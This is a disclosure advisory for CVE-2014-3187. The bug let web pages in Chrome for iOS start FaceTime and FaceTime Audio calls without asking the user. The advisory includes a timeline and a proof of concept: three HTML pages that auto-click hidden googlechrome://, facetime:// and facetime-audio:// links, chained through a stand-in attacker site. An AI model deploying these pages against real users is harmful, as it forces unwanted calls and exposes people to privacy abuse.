## CVE-2014-3187 


|Title          |Issue with Facetime and Facetime-Audio URL Schemes|
----------------------- | --- |
|**Affected Vendor:** |Google |
|**Affected Software:** | Google Chrome for iOS |
|**Affected Version:** | Anything prior to 37.0.2062.60 |
|**Issue Type:** | Lack of user confirmation leading to Facetime and Facetime Audio calls being arbitrarily initialized by an attacker.|
|**Release Date:** | September 23, 2014 |
|**Discovered by:** | Matias P. Brutti - @S9Labs |
|**CVE Identifier:** | CVE-2014-3187 |
|**Issue Status:** | Vendor has published version 37.0.2062.60 on September 22 which corrects this issue by prompting the user before executing Facetime or Facetime-Audio Calls. Official update also came on October 7 [Link](http://googlechromereleases.blogspot.com/2014/10/chrome-for-ios-update.html) |


##### Description

Using the same technique deployed by Andrei Neculaesei ( link: http://algorithm.dk/posts/rtfm-0day-in-ios-apps-g-gmail-fb-messenger-etc ) to bypass some iOS applications including G+, Facebook, Hangouts, among others to launch phone calls automatically without permission. By looking for a way to also exploit this directly on Messages which according to the author of the other vulnerabilities was not possible. After some research, We realized that googlechrome:// was a powerful handler and I was able to also abuse google's chrome url-handlers to automatically initiate FaceTime calls directly from any website or application by using a one or two step attack depending which applications you are on. The attack works on the latest Chrome available for iOS as of 8/25/2014, and allows any person to trigger video FaceTime calls automatically on iOS. 

##### Proof of Concept

For example if using Messages, An attcker could easily send a link friendly link to a malicious or compromised website (i.e http://evilrovot.com/hack.html). Knowing that Safari will *not* open FaceTime:// directly and it will pop-up a message, a two step approach is needed using the googlechrome:// URL handler to open a new chrome window on a new page which will trigger the vulnerability on http://evilrovot.com/test.html. 

[ APP RECEIVING LINK ] --> [ SAFARI ] --> [ GOOGLE CHROME ] --> [ FACETIME ] 

Code for this files is as follow:

hack.html
```html
<html>
<body>
<a id="callme" href="googlechrome://evilrovot.com/test.html" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```

test.html
```html
<html>
<body>
<a id="callme" href="facetime://+0000" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```

ft_audio.html
```html
<html>
<body>
<a id="callme" href="facetime-audio://+0000" style="display:none">click</a>
<script>
var t = document.getElementById("callme");
var fe = document.createEvent("MouseEvents");
fe.initEvent("click", true, true);
t.dispatchEvent(fe);
</script>
</body>
</html>
```
##### Recommendations
The ideal behavior should be that it triggers a pop-up asking the user wether he/she wants to start a FaceTime or FaceTime-Audio conversation with the number in question.

##### Timeline
```
8/24 — Issue was reported to Google
8/27 — Expanded bug to add facetime-audio as well
8/27 — Both issues were accepted and tracked.
9/10 — Status update communication with team.
9/12 — Migrated to Chromium project.
9/12 — Issue fixed on Chromium open source project.
9/22 — Google Chrome for iOS update available
9/23 — Section9Labs makes issue public.
10/7 — Google makes vulnerability public CVE-2014–3187
```

##### Full Write-Up
[https://medium.com/section-9-lab/abusing-ios-url-handlers-on-messages-96979e8b12f5](https://medium.com/section-9-lab/abusing-ios-url-handlers-on-messages-96979e8b12f5)
